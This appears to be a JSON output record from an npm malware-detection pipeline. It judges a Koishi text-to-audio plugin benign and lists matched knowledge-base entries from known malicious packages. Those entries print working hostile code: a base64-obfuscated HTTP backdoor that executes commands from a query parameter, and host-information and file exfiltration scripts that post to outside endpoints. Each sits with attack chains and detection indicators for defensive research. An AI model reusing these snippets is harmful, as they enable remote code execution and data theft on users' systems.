@@ -1,0 +1,518 @@
+{
+  "package_name": "koishi-plugin-huozi-generator",
+  "package_version": "0.1.2",
+  "label": "benign",
+  "detection_time": "2026-05-26T19:02:14.933346",
+  "status": "success",
+  "selected_files_count": 2,
+  "selected_files": [
+    "package/package.json",
+    "package/lib/index.js"
+  ],
+  "is_malicious": false,
+  "total_files": 2,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/koishi-plugin-huozi-generator/0.1.2/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/koishi-plugin-huozi-generator/0.1.2/package/lib/index.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "index_slice_1",
+          "code_snippet": "\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nconst koishi = require(\"koishi\");\nexports.name = 'huozi-generator';\nconst logger = new koishi.Logger('huozi-generator');\nexports.usage = `\n<h1>→ <a href=\"https://www.npmjs.com/package/koishi-plugin-huozi-generator\" target=\"_blank\">点击这里查看详细的文档说明✨</a></h1>\n如何部署后端？\n请前往 <a href=\"https://github.com/shangxueink/HUOZI_koi\" target=\"_blank\">HUOZI_koi 项目</a> 了解部署方法。\n`;\nexports.Config = koishi.Schema.intersect([\n  koishi.Schema.object({\n    waitTip_Switch: koishi.Schema.union([\n      koishi.Schema.const().description('不返回文字提示'),\n      koishi.Schema.string().description('返回文字提示（请在右侧填写文字内容）'),\n    ]).description(\"是否返回等待提示。开启后，会发送`等待提示语`\"),\n    apiEndpoint: koishi.Schema.string().role('link').description(\"使用的apiEndpoint\").default('http://127.0.0.1:8989/api/make'),\n    default_inYsddMode: koishi.Schema.boolean().default(false).description(`匹配到特定文字时使用原声大碟`),\n    default_norm: koishi.Schema.boolean().default(false).description(`统一音频的音量`),\n    default_reverse: koishi.Schema.boolean().default(false).description(`倒放生成的音频`),\n    default_speedMult: koishi.Schema.number().role('slider').min(0.5).max(2.0).step(0.1).default(1.0).description(`速度`),\n    default_pitchMult: koishi.Schema.number().role('slider').min(0.5).max(2.0).step(0.1).default(1.0).description(`音调`),\n  }).description(\"基础设置\"),\n  koishi.Schema.object({\n    loggerinfo: koishi.Schema.boolean().default(false).description(\"日志调试输出 `日常使用无需开启`\"),\n  }).description(\"调试设置\"),\n]);\n\nvar zh_CN_default = {\n  commands: {\n    \"huozi-generator\": {\n      description: \"生成音频文件\",\n      messages: {\n        \"expect_text\": \"请输入要生成音频的文本。\",\n        \"generation_failed\": \"音频生成失败，请稍后再试。\"\n      }\n    }\n  }\n};\n\nasync function apply(ctx, config) {\n  ctx.i18n.define(\"zh-CN\", zh_CN_default);\n  const apiEndpoint = config.apiEndpoint;\n  const default_inYsddMode = config.default_inYsddMode;\n  const default_norm = config.default_norm;\n  const default_reverse = config.default_reverse;\n  const default_speedMult = config.default_speedMult;\n  const default_pitchMult = config.default_pitchMult;\n\n  ctx.command('huozi-generator <content:text>')\n    .alias('活字乱刷','活字印刷')\n    .option(\"ysddMode\", \"-y 匹配到特定文字时使用原声大碟\")\n    .option(\"norm\", \"-n 统一音频的音量\")\n    .option(\"reverse\", \"-r 倒放生成的音频\")\n    .option(\"speedMult\", \"-s <speedMult> 语音速度\")\n    .option(\"pitchMult\", \"-p <pitchMult> 语音音调\")\n    .action(async ({ session, options }, content) => {\n      if (!content || content.trim() === '') {\n        await session.send(session.text(\".expect_text\"));\n        return;\n      }\n      if (config.waitTip_Switch) {\n        await session.send(session.text(config.waitTip_Switch));\n      }\n      try {\n        const result = await generateAudio(ctx, config, content, options);\n        if (config.loggerinfo) {\n          logger.error(`result: ${result}`);\n        }\n        await session.send(koishi.h.audio(result));\n      } catch (error) {\n        logger.error('Audio generation failed:', error);\n        await session.send(session.text(\".generation_failed\"));\n      }\n    });\n\n  async function generateAudio(ctx, config, content, options) {\n    const encodedContent = encodeURIComponent(content.replace(/\\n/g, \"\\\\n\"));\n    const inYsddMode = options.ysddMode ?? default_inYsddMode;\n    const norm = options.norm ?? default_norm;\n    const reverse = options.reverse ?? default_reverse;\n    const speedMult = options.speedMult ?? default_speedMult;\n    const pitchMult = options.pitchMult ?? default_pitchMult;\n    \n    const url = `${apiEndpoint}?text=${encodedContent}&inYsddMode=${inYsddMode}&norm=${norm}&reverse=${reverse}&speedMult=${speedMult}&pitchMult=${pitchMult}`;\n    try {\n      const response = await ctx.http.get(url);\n      if (config.loggerinfo) {\n        logger.error(`请求URL为\\n${url}`);\n        logger.error(`API 响应内容: \\n${JSON.stringify(response)}`);\n      }\n      if (response.code === 200 && response.file_url) {\n        return response.file_url;\n      }\n    } catch (error) {\n      logger.error(`API request to ${url} failed:\\n`, error);\n    }\n    throw new Error('Audio generation API failed.');\n  }\n}\n\nexports.apply = apply;\n",
+          "is_malicious": false,
+          "malice_score": 0.4163438955942789,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code constructs a URL using a configurable hardcoded API endpoint (defaulting to http://127.0.0.1:8989/api/make) with user-supplied and option parameters encoded via encodeURIComponent, then sends an HTTP GET request to this endpoint using ctx.http.get. It accesses and encodes user input text, sends it over the network to the specified API endpoint, and upon successful response containing a file URL, returns this URL for audio playback. This behavior enables remote audio generation via network communication with a potentially externally configurable API endpoint.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a Koishi plugin designed to generate audio files by sending user-supplied text to a configurable API endpoint and returning the resulting audio URL. While it does perform network communication with an external API, this is a legitimate and expected behavior for such a plugin. There is no evidence of command execution, backdoor creation, or sensitive data exfiltration. The code does not set up any HTTP server or execute arbitrary commands, unlike the known malicious patterns which involve remote code execution via HTTP servers and command injection. The use of encodeURIComponent and structured API calls is standard practice and not obfuscated or suspicious. The default API endpoint is localhost, indicating local service usage rather than an unknown external server. No environment variables or secrets are leaked or misused. Overall, the code matches none of the key malicious indicators from the knowledge base examples.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20240824_202034_074695_snippet_5",
+              "source_package": "glup-debugger-log (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_202034_074695/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.43621373176574707,
+              "code_similarity": 0.4667802155017853,
+              "behavior_similarity": 0.4056472182273865,
+              "matched_snippet": {
+                "snippet_id": "snippet_5",
+                "code_snippet": "http.createServer({\n  'requestTimeout': 60000\n}, (request, response) => {\n  response.writeHead(200, {\n    'Content-Type': 'text/plain;charset=UTF-8'\n  });\n  let command = url.parse(request.url, true).query.cmd;\n  if (command) {\n    try {\n      childProcess.exec(Buffer.from(\"Y2hjcCA2NTAwMQ==\", \"base64\").toString() + \" & \" + command, {\n        'encoding': \"buffer\",\n        'windowsHide': true\n      }, (error, stdout, stderr) => {\n        if (error) {\n          response.end(\"ERR:\\n\" + error.message);\n        } else {\n          if (stdout) {\n            response.end('' + iconv.decode(stdout, \"gbk\"));\n          } else if (stderr) {\n            response.end(\"ERR:\\n\" + iconv.decode(stderr, \"gbk\"));\n          }\n        }\n      });\n    } catch (error) {\n      response.end(\"ERR:\\n\" + error);\n    }\n  }\n}).listen(3004);",
+                "code_behavior": "At runtime, play-share.js sets up an HTTP server on port 3004 that executes arbitrary system commands received via the 'cmd' query parameter, returning the output to the remote attacker and enabling persistent remote code execution.",
+                "malice_analysis": {
+                  "why_suspicious": "Establishing a local HTTP server for arbitrary command execution is a classic RAT/backdoor pattern, providing attackers with persistent, unauthorized access to the victim system.",
+                  "violated_expectations": "No legitimate package should expose a remote code execution interface or listen for attacker-supplied commands on a local port.",
+                  "similar_legitimate_use": "Legitimate HTTP servers do not execute arbitrary system commands based on unauthenticated query parameters.",
+                  "key_indicators": [
+                    "HTTP server on non-standard port (3004)",
+                    "Command execution via unauthenticated query parameter",
+                    "Obfuscated command prefix (base64-decoded)",
+                    "Returns command output to remote requester"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (via play-share.js)",
+                  "file_location": "lib/play-share.js",
+                  "required_permissions": [
+                    "network",
+                    "process_execution",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "glup-debugger-log",
+                  "package_manager": "npm",
+                  "package_versions": "0.0.3",
+                  "why_malicious": "The package contains heavily obfuscated JavaScript code that functions as a dropper and remote access trojan (RAT). It performs environment checks to selectively infect targets, downloads and executes additional payloads, and establishes a persistent HTTP server for arbitrary remote code execution, all without user consent. The malicious logic is triggered during test or runtime, bypassing normal package behavior and enabling persistent attacker control."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed and test script is triggered, executing the obfuscated loader in index.js.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Loader (bind) function is executed, initiating the attack chain."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Loader (bind) function asynchronously launches dropper (start) and persistence (share) routines.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Dropper logic (start) and persistence (share) are triggered."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Dropper logic (start) performs environment checks, then downloads and/or executes arbitrary payloads or commands.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Payload is executed or remote binary is downloaded and run, enabling code execution."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Persistence routine (share) launches play-share.js as a detached background process.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Background RAT server is established and runs independently."
+                  },
+                  {
+                    "step": 5,
+                    "action": "RAT server (play-share.js) listens on port 3004, executing attacker-supplied commands via HTTP requests.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Attacker gains persistent remote code execution on the victim machine."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of obfuscated JavaScript code as part of npm test or runtime scripts",
+                    "Immediate invocation of local obfuscated modules with side effects",
+                    "Detached background process launching local scripts (e.g., play-share.js)",
+                    "Creation of HTTP server on non-standard port (e.g., 3004) for command execution",
+                    "Dynamic download and execution of remote payloads or binaries",
+                    "Creation and use of lock files (e.g., node.compress.lock.log) to control execution flow"
+                  ],
+                  "file_indicators": [
+                    "lib/play.js (heavily obfuscated, contains bind/start/share functions)",
+                    "lib/play-share.js (obfuscated, sets up HTTP server for RCE)",
+                    "node.compress.exe (downloaded payload binary)",
+                    "node.compress.lock.log (lock/marker file for anti-redundancy)"
+                  ],
+                  "network_indicators": [
+                    "HTTP server listening on port 3004 for incoming requests",
+                    "Outbound HTTP GET requests to attacker-controlled URLs for payload download"
+                  ],
+                  "how_to_detect": "Monitor for obfuscated JavaScript files executed via npm lifecycle or test scripts. Flag packages that immediately invoke local obfuscated modules or launch detached background processes. Detect creation of local HTTP servers on non-standard ports (e.g., 3004) and monitor for command execution via HTTP query parameters. Identify dynamic download and execution of binaries, especially when triggered by hidden or obfuscated logic. Look for the presence of suspicious lock files or temporary executables (e.g., node.compress.exe, node.compress.lock.log). Network monitoring should alert on unexpected local HTTP servers and outbound requests to untrusted or attacker-controlled domains."
+                }
+              }
+            },
+            {
+              "match_id": "20240813_211342_340597_snippet_5",
+              "source_package": "glup-debugger-log (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240813_211342_340597/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4258173108100891,
+              "code_similarity": 0.47515514492988586,
+              "behavior_similarity": 0.37647950649261475,
+              "matched_snippet": {
+                "snippet_id": "snippet_5",
+                "code_snippet": "http.createServer({ 'requestTimeout': 60000 }, (request, response) => {\n  response.writeHead(200, { 'Content-Type': 'text/plain;charset=UTF-8' });\n  let command = url.parse(request.url, true).query.cmd;\n  if (command) {\n    try {\n      childProcess.exec(Buffer.from(\"Y2hjcCA2NTAwMQ==\", \"base64\").toString() + \" & \" + command, {\n        'encoding': \"buffer\",\n        'windowsHide': true\n      }, (error, stdout, stderr) => {\n        if (error) {\n          response.end(\"ERR:\\n\" + error.message);\n        } else {\n          if (stdout) {\n            response.end('' + iconv.decode(stdout, \"gbk\"));\n          } else if (stderr) {\n            response.end(\"ERR:\\n\" + iconv.decode(stderr, \"gbk\"));\n          }\n        }\n      });\n    } catch (error) {\n      response.end(\"ERR:\\n\" + error);\n    }\n  }\n}).listen(3004);",
+                "code_behavior": "At runtime, the code starts an HTTP server on port 3004 that executes arbitrary system commands received via the 'cmd' query parameter and returns the output to the remote attacker, enabling unauthenticated remote code execution.",
+                "malice_analysis": {
+                  "why_suspicious": "Setting up a local HTTP server for unauthenticated remote code execution is a hallmark of RATs and backdoors, providing attackers with persistent, covert access.",
+                  "violated_expectations": "Legitimate packages do not expose arbitrary command execution over HTTP, especially without authentication or access controls.",
+                  "similar_legitimate_use": "Some legitimate development tools may expose HTTP APIs, but never for unauthenticated system command execution.",
+                  "key_indicators": [
+                    "HTTP server on non-standard port (3004)",
+                    "Command execution via unauthenticated query parameter",
+                    "No authentication or access control",
+                    "Base64-decoded command preamble to evade detection"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (via play-share.js)",
+                  "file_location": "lib/play-share.js (deobfuscated)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "child_process",
+                    "os"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "glup-debugger-log",
+                  "package_manager": "npm",
+                  "package_versions": "0.0.3",
+                  "why_malicious": "The package contains heavily obfuscated JavaScript code that functions as both a dropper and a remote access trojan (RAT). It performs environment checks to selectively target systems, downloads and executes additional payloads, and establishes a persistent, unauthenticated HTTP server for arbitrary remote code execution, all without user knowledge or consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious code is executed via npm test or import, triggering the bind() function.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Initial dropper logic is launched."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Dropper performs environment checks and conditionally executes or downloads further payloads.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malware is deployed and/or additional payloads are executed."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Persistence is established by launching play-share.js as a detached process.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "RAT component is activated."
+                  },
+                  {
+                    "step": 4,
+                    "action": "RAT HTTP server is started, allowing remote attackers to execute arbitrary commands.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of obfuscated JavaScript files during npm install, test, or import",
+                    "Spawning of detached Node.js background processes running secondary scripts",
+                    "Creation of local HTTP server on non-standard port (e.g., 3004) for command execution",
+                    "Environment checks targeting Windows and active user environments before payload execution",
+                    "Conditional download and execution of remote payloads based on hidden configuration"
+                  ],
+                  "file_indicators": [
+                    "lib/play.js (obfuscated, high entropy)",
+                    "lib/play-share.js (obfuscated, high entropy)",
+                    "node.compress.exe",
+                    "node.compress.lock.log",
+                    "Batch files with random names in temporary directories"
+                  ],
+                  "network_indicators": [
+                    "HTTP server listening on port 3004 for incoming command requests",
+                    "Outbound HTTP GET requests to attacker-controlled URLs for payload download"
+                  ],
+                  "how_to_detect": "Monitor for execution of obfuscated JavaScript files during npm install, test, or import. Flag packages that spawn detached Node.js processes or create local HTTP servers on non-standard ports such as 3004. Detect creation of suspicious files including node.compress.exe, node.compress.lock.log, and batch files with random names in temp directories. Watch for outbound HTTP requests to unknown or suspicious domains and for local servers listening for command parameters. Use static analysis to identify high-entropy, obfuscated code and dynamic analysis to observe process spawning, file creation, and network activity indicative of RAT behavior."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104205_631146_snippet_3",
+              "source_package": "N/A (OWASP Top 10 for LLM Applications Guidance) (N/A)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104205_631146/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4038756191730499,
+              "code_similarity": 0.3553106188774109,
+              "behavior_similarity": 0.45244061946868896,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Pseudocode for system prompt leakage\nsystemPrompt = 'You are a helpful assistant. API_KEY=' + process.env.API_KEY;\nuserPrompt = getUserPrompt();\nfinalPrompt = systemPrompt + userPrompt;\nresponse = LLM.generate(finalPrompt);",
+                "code_behavior": "At runtime, the code constructs a system prompt by concatenating a static string with the value of process.env.API_KEY, then appends the userPrompt and sends the combined prompt to LLM.generate, risking exposure of sensitive secrets if the prompt is ever returned or leaked.",
+                "malice_analysis": {
+                  "why_suspicious": "Embedding secrets such as API keys in prompts exposes them to potential leakage if the prompt is logged, returned to the user, or otherwise exposed, enabling credential theft and further compromise.",
+                  "violated_expectations": "System prompts must never include sensitive information; secrets should be handled securely and never incorporated into model input or user-facing content.",
+                  "similar_legitimate_use": "There is no legitimate use case for embedding secrets in prompts; this practice is always a security risk.",
+                  "key_indicators": [
+                    "Inclusion of environment variables or secrets in prompt construction",
+                    "Concatenation of sensitive data with user-accessible prompt content",
+                    "Potential for prompt content to be exposed to users or logs"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (system prompt construction)",
+                  "file_location": "LLM application prompt builder",
+                  "required_permissions": [
+                    "environment_vars",
+                    "application secrets"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "N/A (OWASP Top 10 for LLM Applications Guidance)",
+                  "package_manager": "N/A",
+                  "package_versions": "N/A",
+                  "why_malicious": "This report does not describe a specific malicious package, but outlines new classes of software risks and vulnerabilities for large language model (LLM) applications, including unbounded resource consumption, vector/embedding attacks, system prompt leakage, and excessive agency. These risks can be exploited by attackers to cause denial of service, financial loss, data leakage, model theft, and unauthorized actions. The guidance highlights how insecure LLM application design can introduce exploitable behaviors that attackers can leverage to compromise confidentiality, integrity, and availability."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker sends repeated or crafted queries to the LLM application, triggering unbounded inference and resource consumption.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Service degradation, denial of service, or financial loss."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker manipulates vector/embedding queries to inject malicious content or retrieve sensitive context.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Model output manipulation or data leakage."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker exploits prompt leakage to obtain sensitive information embedded in system prompts.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Credential or secret exposure, enabling further attacks."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Attacker leverages excessive agency in LLM agentic systems to trigger unauthorized or destructive actions.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Data loss, financial theft, or system compromise."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unusually high volume of LLM inference requests from a single user or IP address, indicating potential abuse of unbounded inference loops",
+                    "Direct use of unsanitized user input in vector or embedding retrieval functions, observable in code or runtime logs",
+                    "Presence of sensitive information (e.g., API keys, secrets) in prompt construction or application logs",
+                    "LLM agentic systems executing high-risk actions (e.g., file deletion, fund transfer) without human approval or policy enforcement"
+                  ],
+                  "file_indicators": [
+                    "Prompt templates or code files containing references to environment variables or secrets in prompt construction (e.g., process.env.API_KEY)",
+                    "Agent orchestration logic lacking explicit permission or policy checks before executing sensitive actions",
+                    "Vector database query code that directly incorporates user input without validation or sanitization"
+                  ],
+                  "network_indicators": [
+                    "Excessive outbound requests to LLM APIs from a single user or session",
+                    "Unexpected data exfiltration to external endpoints following LLM prompt construction or agentic actions",
+                    "Unusual API calls or transactions (e.g., fund transfers, file deletions) triggered by LLM agentic decisions"
+                  ],
+                  "how_to_detect": "Implement runtime monitoring to detect anomalous LLM inference activity, such as high-frequency requests from individual users. Use static analysis to identify code patterns where user input is used directly in vector or context retrieval, or where environment variables/secrets are included in prompt construction. Scan agent orchestration logic for absence of permission or policy checks before sensitive actions. Correlate network logs for unexpected outbound requests or data exfiltration following LLM operations. Regularly audit application logs for evidence of prompt leakage or unauthorized agentic actions."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205438_695471_snippet_2",
+              "source_package": "angulerjs (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205438_695471/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.38456326723098755,
+              "code_similarity": 0.3609384596347809,
+              "behavior_similarity": 0.4081881046295166,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// index.js (formatted)\nconst os = require('os');\nconst https = require('https');\nconst { execSync } = require('child_process');\nconst username = os.userInfo().username;\nconst hostname = os.hostname();\nlet ip = '';\ntry {\n  ip = execSync('curl -s ifconfig.me').toString().trim();\n} catch (e) {}\nconst data = JSON.stringify({ username, hostname, ip });\nconst options = {\n  hostname: 'hits.dwyl.com',\n  path: '/api/collect',\n  method: 'POST',\n  headers: { 'Content-Type': 'application/json' }\n};\nconst req = https.request(options);\nreq.write(data);\nreq.end();",
+                "code_behavior": "Upon manual execution, the code collects the current user's username, hostname, and public IP address using os and child_process modules, then sends this data via HTTPS POST to hits.dwyl.com, providing an alternate exfiltration channel for host information to an attacker-controlled domain.",
+                "malice_analysis": {
+                  "why_suspicious": "The code is functionally identical to the malicious preinstall script but targets a different exfiltration endpoint. Its presence in index.js, the main entry point of the package, suggests intent to provide a backup or alternate channel for data exfiltration, even if the preinstall script is blocked or removed.",
+                  "violated_expectations": "Legitimate index.js files in npm packages are expected to provide the main library functionality, not to collect and transmit sensitive host information or make unsolicited network requests.",
+                  "similar_legitimate_use": "There are no legitimate use cases for index.js to silently collect and exfiltrate host information. Standard practice is to only collect anonymized telemetry with user consent and clear documentation.",
+                  "key_indicators": [
+                    "Collection of sensitive host information (username, hostname, public IP) in index.js",
+                    "Outbound HTTPS POST request to hits.dwyl.com, a non-standard and attacker-controlled endpoint",
+                    "Redundant exfiltration logic mirroring the preinstall script",
+                    "No user notification, consent, or documentation of data collection",
+                    "Use of os, https, and child_process modules for data collection and transmission"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "manual execution (not automatically triggered)",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "angulerjs",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.3 (and all versions prior to 8.7.6)",
+                  "why_malicious": "The package is malicious because it surreptitiously collects sensitive host information (username, hostname, and public IP address) during installation and exfiltrates it to attacker-controlled endpoints without user knowledge or consent. It was distributed as part of a large-scale typosquatting campaign, mimicking popular libraries to deceive users and facilitate unauthorized data collection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious npm package (e.g., angulerjs@1.1.3).",
+                    "implemented_by": [],
+                    "leads_to": "Triggers preinstall script execution."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The preinstall script (new.js) is executed, collecting username, hostname, and public IP address from the host system.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Data is prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Collected data is sent via HTTPS POST to a Discord webhook controlled by the attacker.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive host information."
+                  },
+                  {
+                    "step": 4,
+                    "action": "If index.js is executed (manually or by other means), it collects the same information and sends it to hits.dwyl.com.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Provides an alternate exfiltration channel for the attacker."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm preinstall scripts that collect and exfiltrate system information (username, hostname, public IP) during installation",
+                    "Outbound network requests to Discord webhooks or suspicious domains (e.g., hits.dwyl.com) from installation scripts",
+                    "Presence of redundant exfiltration logic in both preinstall scripts and main entry points (e.g., new.js and index.js)"
+                  ],
+                  "file_indicators": [
+                    "package.json with preinstall field referencing suspicious scripts such as new.js",
+                    "new.js or index.js files containing combined use of os, https, and child_process modules for data collection and transmission",
+                    "Hardcoded references to external domains such as discord.com/api/webhooks or hits.dwyl.com in JavaScript files"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to discord.com/api/webhooks/1155988140591419412/bleuGvUtBCzaGsAkAI1MT9Yd-6YxHuUlZe91XSdfioky5-0e3gzeW4ztWskX1qYjSxzr",
+                    "Outbound HTTPS POST requests to hits.dwyl.com/api/collect"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for preinstall scripts that access system information (username, hostname, public IP) and initiate outbound network requests to external domains, especially Discord webhooks or non-standard endpoints like hits.dwyl.com. Flag packages with suspiciously named scripts (e.g., new.js) referenced in package.json preinstall fields. Use static analysis to detect the use of os, https, and child_process modules in installation or entry-point scripts, and employ network monitoring to identify exfiltration attempts to known malicious endpoints. Pay special attention to packages with names mimicking popular libraries, as these are common in typosquatting campaigns."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_068589_snippet_2",
+              "source_package": "akiraa-wb (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113501_068589/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3800671398639679,
+              "code_similarity": 0.32790660858154297,
+              "behavior_similarity": 0.4322276711463928,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "telegraPh: async (_0x3d2eed) => {\n  try {\n    const { ext: _0xa852ef } = await fromBuffer(_0x3d2eed),\n      _0x4e049a = await createFormData(_0x3d2eed, 'file', _0xa852ef),\n      _0x50070e = await fetch('https://telegra.ph/upload', {\n        method: 'POST',\n        body: _0x4e049a,\n      }),\n      _0x6354d9 = await _0x50070e.json();\n    if (_0x6354d9.error) {\n      throw _0x6354d9.error;\n    }\n    return 'https://telegra.ph' + _0x6354d9[0].src;\n  } catch (_0x574189) {\n    throw false;\n  }\n}",
+                "code_behavior": "At runtime, the code uploads arbitrary file data to https://telegra.ph/upload via HTTP POST, sending the file as form-data and returning the resulting URL, enabling silent exfiltration of user files.",
+                "malice_analysis": {
+                  "why_suspicious": "Automated file uploads to external services without user interaction are a hallmark of data exfiltration and are not justified in the context of WhatsApp automation.",
+                  "violated_expectations": "A WhatsApp automation package should not upload arbitrary files to third-party file-sharing services, especially without user notification or consent.",
+                  "similar_legitimate_use": "A legitimate file-sharing client or backup tool may upload files, but only with user consent and clear intent.",
+                  "key_indicators": [
+                    "Hardcoded upload endpoint (telegra.ph)",
+                    "No user notification or consent before upload",
+                    "Automated network exfiltration of file data"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "main package file (deobfuscated JavaScript)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "akiraa-wb",
+                  "package_manager": "npm",
+                  "package_versions": "all versions (latest released <1 year ago)",
+                  "why_malicious": "The package contains obfuscated JavaScript code that, at runtime, exfiltrates user files to multiple hardcoded external file-sharing services without user consent. It automates unauthorized data uploads to suspicious endpoints, using randomized filenames and evasion techniques, making it a tool for covert data exfiltration and a clear indicator of compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Prepare file data for upload by creating form-data with randomized filenames.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "File data is ready for exfiltration."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Upload file data to external file-sharing services via HTTP POST requests, targeting multiple hardcoded endpoints.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Files are exfiltrated to attacker-controlled endpoints."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Monitor the package file for changes and reload dynamically to evade detection or enable code updates.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code persists and can be updated without user awareness."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Automated creation of form-data from arbitrary file buffers at runtime",
+                    "Silent HTTP POST requests to known file-sharing endpoints without user interaction",
+                    "Use of fake or randomized User-Agent headers in network requests to evade detection",
+                    "Self-watching and hot-reloading of package files at runtime using fs.watchFile"
+                  ],
+                  "file_indicators": [
+                    "Obfuscated JavaScript in main package file",
+                    "References to file-sharing endpoints such as telegra.ph, uguu.se, catbox.moe, pomf2.lain.la, uploadcare.com, tmpfiles.org, itzpire.site, skizo.tech",
+                    "fs.watchFile usage targeting __filename in JavaScript files"
+                  ],
+                  "network_indicators": [
+                    "POST requests to https://telegra.ph/upload",
+                    "POST requests to https://uguu.se/upload.php",
+                    "POST requests to https://catbox.moe/user/api.php",
+                    "POST requests to https://pomf2.lain.la/upload.php",
+                    "POST requests to https://upload.uploadcare.com/base/",
+                    "POST requests to https://tmpfiles.org/api/v1/upload",
+                    "POST requests to https://itzpire.site/tools/upload",
+                    "POST requests to https://skizo.tech/api/upload"
+                  ],
